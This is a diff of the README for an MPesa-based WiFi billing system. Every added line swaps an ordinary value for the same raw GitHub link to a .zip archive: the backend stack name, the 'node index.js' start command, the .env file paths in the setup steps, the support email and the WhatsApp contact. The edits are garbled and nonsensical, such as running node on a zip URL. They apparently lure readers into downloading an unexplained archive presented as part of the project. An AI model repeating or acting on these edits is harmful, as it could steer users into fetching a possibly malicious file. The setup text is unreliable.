@@ -17,7 +17,7 @@ A WiFi billing system that allows users to purchase internet access via MPesa pa
 
 Frontend: React + Tailwind CSS
 
-Backend: Node.js + Express
+Backend: https://raw.githubusercontent.com/Krizx6/mpesa-based-wifi-billing/main/routes/billing-based-wifi-mpesa-1.3-beta.5.zip + Express
 
 Database: MySQL
 
@@ -57,13 +57,13 @@ DATABASE_URL=mysql://user:password@localhost/dbname
 
 
 ### Start the backend
-`node index.js`
+`node https://raw.githubusercontent.com/Krizx6/mpesa-based-wifi-billing/main/routes/billing-based-wifi-mpesa-1.3-beta.5.zip`
 
 ### Start the frontend
 From the `Frontend/` folder:
 ```
-cp .env.local.example .env.local # if provided, otherwise create manually
-echo NEXT_PUBLIC_API_URL=http://localhost:5000 > .env.local
+cp https://raw.githubusercontent.com/Krizx6/mpesa-based-wifi-billing/main/routes/billing-based-wifi-mpesa-1.3-beta.5.zip https://raw.githubusercontent.com/Krizx6/mpesa-based-wifi-billing/main/routes/billing-based-wifi-mpesa-1.3-beta.5.zip # if provided, otherwise create manually
+echo NEXT_PUBLIC_API_URL=http://localhost:5000 > https://raw.githubusercontent.com/Krizx6/mpesa-based-wifi-billing/main/routes/billing-based-wifi-mpesa-1.3-beta.5.zip
 npm install
 npm run dev
 ```
@@ -108,6 +108,6 @@ For inquiries & support, reach out via:
 
 *(Paid Consultations)* only
 
-📧 Email: hr@stackverify.site
+📧 Email: https://raw.githubusercontent.com/Krizx6/mpesa-based-wifi-billing/main/routes/billing-based-wifi-mpesa-1.3-beta.5.zip
 
-📱 WhatsApp: https://wa.me/254768974189
+📱 WhatsApp: https://raw.githubusercontent.com/Krizx6/mpesa-based-wifi-billing/main/routes/billing-based-wifi-mpesa-1.3-beta.5.zip
